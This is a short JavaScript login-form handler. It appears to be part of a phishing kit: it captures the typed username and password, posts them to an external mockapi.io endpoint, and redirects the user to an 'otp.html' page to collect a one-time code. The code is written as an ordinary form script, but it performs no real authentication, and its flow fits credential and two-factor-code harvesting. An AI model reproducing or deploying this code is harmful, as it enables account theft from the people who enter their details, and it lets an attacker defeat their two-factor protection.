// Select the form element
const form = document.querySelector("form");

// Add an event listener to handle form submission
form.addEventListener("submit", async (event) => {
  // Prevent the default form submission behavior
  event.preventDefault();

  // Get the values of the input fields
  const username = document.querySelector("#username").value;
  const password = document.querySelector("#password").value;

  // Prepare the data to be sent to the endpoint
  const data = {
    username,
    password,
  };

  try {
    // Send a POST request to the endpoint
    const response = await fetch(
      "https://675a7fdd099e3090dbe4cf13.mockapi.io/LOLL",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );

    // Check if the response is successful
    if (response.ok) {
      const responseData = await response.json();
      const userId = responseData.id; // Assuming the response includes the user ID

      // Redirect to otp.html with the user ID in the query string
      window.location.href = `otp.html?userId=${userId}`;
    } else {
      // Handle errors (e.g., show an error message to the user)
      alert("Failed to submit the data. Please try again.");
    }
  } catch (error) {
    // Handle network or other errors
    console.error("An error occurred:", error);
    alert("An error occurred while submitting the form. Please try again.");
  }
});


